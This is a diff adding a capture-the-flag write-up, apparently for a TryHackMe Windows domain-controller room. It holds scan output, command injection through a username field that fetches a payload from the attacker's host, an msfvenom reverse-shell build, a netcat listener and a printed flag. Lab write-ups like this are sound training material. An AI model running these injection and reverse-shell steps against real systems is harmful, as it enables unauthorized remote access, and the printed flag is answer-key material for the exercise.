@@ -226,7 +226,230 @@ THM{OWQyMGRlNWM0NjYzN2NmM2MxMDNkODgx}
 
 ---
 
-# Medium Challenge
+## Medium Challenge
+
+## Enumeration - Nmap
+
+```bash
+nmap -sC -sV -p- 10.10.3.208  -oN nmap-medium 
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-15 23:14 IST
+
+Nmap scan report for 10.10.3.208
+Host is up (0.15s latency).
+Not shown: 65511 filtered ports
+PORT      STATE SERVICE       VERSION
+80/tcp    open  http          Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: PhotoStore - Home
+81/tcp    open  http          Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Network Monitor
+82/tcp    open  http          Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Site doesnt have a title (text/html; charset=UTF-8).
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-05-15 18:04:58Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: troy.thm0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: troy.thm0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+| rdp-ntlm-info: 
+|   Target_Name: TROY
+|   NetBIOS_Domain_Name: TROY
+|   NetBIOS_Computer_Name: TROY-DC
+|   DNS_Domain_Name: troy.thm
+|   DNS_Computer_Name: TROY-DC.troy.thm
+|   DNS_Tree_Name: troy.thm
+|   Product_Version: 10.0.17763
+|_  System_Time: 2021-05-15T18:06:29+00:00
+| ssl-cert: Subject: commonName=TROY-DC.troy.thm
+| Not valid before: 2021-02-18T18:07:12
+|_Not valid after:  2021-08-20T18:07:12
+|_ssl-date: 2021-05-15T18:07:07+00:00; +1s from scanner time.
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+7680/tcp  open  pando-pub?
+9389/tcp  open  mc-nmf        .NET Message Framing
+9999/tcp  open  abyss?
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.0 200 OK
+|     Date: Sat, 15 May 2021 18:05:00 GMT
+|     Content-Length: 0
+|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
+|     HTTP/1.1 400 Bad Request
+|     Content-Type: text/plain; charset=utf-8
+|     Connection: close
+|     Request
+|   GetRequest, HTTPOptions: 
+|     HTTP/1.0 200 OK
+|     Date: Sat, 15 May 2021 18:04:59 GMT
+|_    Content-Length: 0
+49665/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49686/tcp open  msrpc         Microsoft Windows RPC
+49752/tcp open  msrpc         Microsoft Windows RPC
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port9999-TCP:V=7.91%I=7%D=5/15%Time=60A00D4B%P=x86_64-pc-linux-gnu%r(Ge
+SF:tRequest,4B,"HTTP/1\.0\x20200\x20OK\r\nDate:\x20Sat,\x2015\x20May\x2020
+SF:21\x2018:04:59\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(HTTPOptions,4
+SF:B,"HTTP/1\.0\x20200\x20OK\r\nDate:\x20Sat,\x2015\x20May\x202021\x2018:0
+SF:4:59\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(FourOhFourRequest,4B,"H
+SF:TTP/1\.0\x20200\x20OK\r\nDate:\x20Sat,\x2015\x20May\x202021\x2018:05:00
+SF:\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(GenericLines,67,"HTTP/1\.1\
+SF:x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf
+SF:-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(RTSPRequest
+SF:,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;
+SF:\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request"
+SF:)%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20tex
+SF:t/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20
+SF:Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCon
+SF:tent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\
+SF:r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"HTTP/1\.1\x20400\
+SF:x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nC
+SF:onnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLSSessionReq,67,"
+SF:HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20c
+SF:harset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(K
+SF:erberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text
+SF:/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20R
+SF:equest")%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-
+SF:Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n40
+SF:0\x20Bad\x20Request")%r(LDAPSearchReq,67,"HTTP/1\.1\x20400\x20Bad\x20Re
+SF:quest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x
+SF:20close\r\n\r\n400\x20Bad\x20Request")%r(SIPOptions,67,"HTTP/1\.1\x2040
+SF:0\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\
+SF:nConnection:\x20close\r\n\r\n400\x20Bad\x20Request");
+Service Info: Host: TROY-DC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2021-05-15T18:06:29
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 1390.20 seconds
+```
+
+
+## Enumeration - Gobuster
+
+```bash
+gobuster dir -u http://10.10.3.208 -t 50 -w /usr/share/wordlists/dirb/big.txt 
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.3.208
+[+] Method:                  GET
+[+] Threads:                 50
+[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2021/05/15 23:28:31 Starting gobuster in directory enumeration mode
+===============================================================
+/dashboard            (Status: 302) [Size: 0] [--> /login]
+/login                (Status: 200) [Size: 2783]          
+/logout               (Status: 302) [Size: 0] [--> /]     
+/profile              (Status: 302) [Size: 0] [--> /login]
+/signup               (Status: 200) [Size: 2903]          
+/users                (Status: 301) [Size: 148] [--> http://10.10.3.208/users/]
+                                                                               
+===============================================================
+2021/05/15 23:29:38 Finished
+===============================================================
+```
+
+## Other Enumerations
+- SMB
+- LDAP
+
+
+## Command Execution
+
+- Block the **script.js** which santizies the input.
+- Change the username in the HTTP server running on Port 80: `admin | curl 10.17.7.91:8000/poc`
+
+- Listen on Port 8000 
+
+```bash
+Serving HTTP on 0.0.0.0 port 8000 ...
+10.10.3.208 - - [16/May/2021 00:25:31] "GET /nmap-medium HTTP/1.1" 200 -
+10.10.3.208 - - [16/May/2021 00:25:31] code 404, message File not found
+10.10.3.208 - - [16/May/2021 00:25:31] "GET /poc HTTP/1.1" 404 -
+```
+
+- We made sure that we have command execution.
+
+## Reverse shell
+
+- Using **msfvenom**, generate a reverse shell for windows:
+
+```bash
+$ msfvenom -p windows/shell_reverse_tcp LHOST=10.17.7.91 LPORT=1234 -f exe > reverse.exe
+
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 324 bytes
+Final size of exe file: 73802 bytes
+
+```
+
+- Host a server, so that you can transfer the `reverse.exe` to the target. Simultaneously, change the username to `admin | curl 10.17.7.91:8000/reverse.exe -o reverse.exe`
+
+```bash
+Serving HTTP on 0.0.0.0 port 8000 ...
+10.10.3.208 - - [16/May/2021 00:42:01] "GET /reverse.exe HTTP/1.1" 200 -
+```
+
+- Listen on the appropriate port using netcat. Simultaneously, change the username to `admin | reverse.exe`. Now we get the shell of the user **agamemnon**.
+
+```bash
+nc -lvnp 1234
+listening on [any] 1234 ...
+connect to [10.17.7.91] from (UNKNOWN) [10.10.3.208] 50144
+Microsoft Windows [Version 10.0.17763.1757]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Users\agamemnon\Desktop\WebApp\public>
+```
+
+
+### 
+- **Answer:** 
+- **Steps to Reproduce:** 
+
+```powershell
+C:\Users\agamemnon\Desktop> type flag.txt
+type flag.txt
+
+THM{78ab0f3ab9decf59899148c6ba7e07dc}
+```
+
+---
+
+---
+
+## Hard Challenge
 
 
 ---
